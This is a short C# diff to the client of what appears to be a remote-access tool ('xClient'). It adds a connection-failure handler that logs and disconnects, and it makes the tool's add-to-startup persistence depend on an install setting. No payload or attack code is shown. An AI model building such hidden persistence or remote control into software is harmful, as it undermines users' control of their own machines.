@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
@@ -102,6 +103,7 @@ namespace xClient
 
             ConnectClient.ClientState += ClientState;
             ConnectClient.ClientRead += ClientRead;
+            ConnectClient.ClientFail += ClientFail;
         }
 
         private static void Initialize()
@@ -133,7 +135,7 @@ namespace xClient
 
                 new Thread(SystemCore.UserIdleThread).Start();
 
-                if (Settings.STARTUP)
+                if (Settings.STARTUP && Settings.INSTALL)
                 {
                     SystemCore.AddToStartup();
                 }
@@ -227,6 +229,12 @@ namespace xClient
         private static void ClientRead(Client client, IPacket packet)
         {
             PacketHandler.HandlePacket(client, packet);
+        }
+
+        private static void ClientFail(Client client, Exception ex)
+        {
+            Debug.WriteLine("Exception Message: " + ex.Message);
+            client.Disconnect();
         }
     }
 }
